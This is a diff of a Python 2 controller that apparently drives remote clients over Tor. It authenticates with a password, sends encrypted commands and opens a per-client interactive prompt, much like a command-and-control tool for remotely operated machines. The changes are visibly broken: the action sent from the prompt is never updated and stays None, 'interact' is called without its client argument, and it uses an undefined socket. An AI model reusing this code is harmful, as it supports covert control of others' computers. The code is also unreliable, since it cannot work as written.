@@ -36,13 +36,14 @@ class control():
 		tor_process.kill() 
 	
 	def interact(self, client):
-		baseCmd = {"status":"OK", "command": "interact", "client":str(client), "action":}
+		action = None
+		baseCmd = {"status":"OK", "command": "interact", "client":str(client), "action":action}
 		title = "Client{cli}$".format(cli=client)
 		while True:
-			command = raw_input(title)
-			if command == "quit": break
+			action = raw_input(title)
+			if action == "quit": break
 			else:
-				command = Encode().process(command)
+				command = Encode().process(baseCmd)
 				command = encryption().encrypt(command, config["password"])
 				main().s.send(command)
 				reply = s.recv(20480)
@@ -62,7 +63,7 @@ class control():
 		except Exception as e:
 			sys.exit(e)
 
-		login = {"status":"OK", "command":"authenticate", 'password':str(args.password)}
+		login = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command":"authenticate", 'password':str(args.password)}
 		login = Encode().process(login)
 		login = encryption().encrypt(login, config["password"])
 		s.send(login)
@@ -78,8 +79,9 @@ class control():
 				else:
 					answers = command.split(' ')
 					if answers[0] == "interact" and len(answers) == 2:
-						Cmd = {"status":"OK", "command": answers[0], "client":str(answers[1])}
-					else: Cmd = {"status":"OK", "command": answers[0]}
+						Cmd = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command": answers[0], "client":str(answers[1])}
+						inter = control().interact()
+					else: Cmd = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command": answers[0]}
 					Cmd = Encode().process(Cmd)
 					Cmd = encryption().encrypt(Cmd, config["password"])
 					s.send(Cmd)
@@ -93,7 +95,7 @@ class control():
 				try:
 					s.send("quit")
 					s.close()
-					stopTor()
+					control().stopTor()
 					print " [!] Connection Closed"
 					break
 				except:
@@ -102,7 +104,7 @@ class control():
 				print e
 				print " [!] Connection Closed"
 				s.close()
-				stopTor()
+				control().stopTor()
 				break
 
 if __name__=="__main__":
